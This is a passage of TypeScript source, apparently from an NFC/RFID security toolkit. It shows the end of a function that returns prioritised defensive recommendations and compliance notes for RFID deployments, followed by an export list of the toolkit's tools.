          { category: "Access Control", priority: "medium", recommendation: "Restrict RFID reader access to authorized personnel", implementation: "Reader authentication before tag writes, audit logging" },
        ];
        break;

      default:
        return text(`Unknown deployment type '${deployment}'. Use: physical_access, payment, or inventory`);
    }

    return json({
      deployment,
      currentThreats,
      upgradePath,
      recommendations: recommendations.sort((a, b) => {
        const priorityOrder: Record<string, number> = { critical: 4, high: 3, medium: 2, low: 1 };
        return (priorityOrder[b.priority] || 0) - (priorityOrder[a.priority] || 0);
      }),
      quickWins: recommendations
        .filter((r) => r.priority === "critical" || r.priority === "high")
        .slice(0, 3)
        .map((r) => r.recommendation),
      complianceNotes: [
        deployment === "payment" ? "PCI DSS requires contactless payment security controls" : null,
        deployment === "physical_access" ? "NIST SP 800-116 provides RFID access control guidelines" : null,
        "ISO/IEC 14443 and ISO/IEC 15693 define NFC/RFID interface standards",
        "Local regulations may require specific RFID security measures for PII",
      ].filter(Boolean),
    });
  },
};

// ─── Export All NFC/RFID Tools ───

export const nfcRfidTools: ToolDef[] = [
  nfcLookupAttack,
  nfcSearchAttacks,
  nfcCardIdentify,
  nfcCloneGuide,
  nfcDefense,
];
